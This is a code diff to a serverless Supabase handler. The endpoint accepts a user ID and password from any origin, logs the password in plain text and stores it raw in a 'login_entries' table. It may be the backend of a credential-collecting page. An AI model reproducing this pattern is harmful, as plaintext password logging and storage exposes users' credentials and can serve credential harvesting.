@@ -6,7 +6,7 @@ const supabase = createClient(
 );
 
 export default async function handler(req, res) {
-  // Allow CORS (important)
+  // Allow CORS
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
@@ -22,14 +22,14 @@ export default async function handler(req, res) {
   try {
     const { user_id, pass } = req.body;
 
-    console.log("Received:", { user_id, pass }); // check Vercel logs
+    console.log("Received:", { user_id, pass });
 
     if (!user_id || !pass) {
       return res.status(400).json({ error: "Missing user_id or pass" });
     }
 
     const { data, error } = await supabase
-      .from("your_table_name")   // ← CHANGE THIS to your exact table name
+      .from("login_entries")
       .insert([
         {
           user_id: user_id,
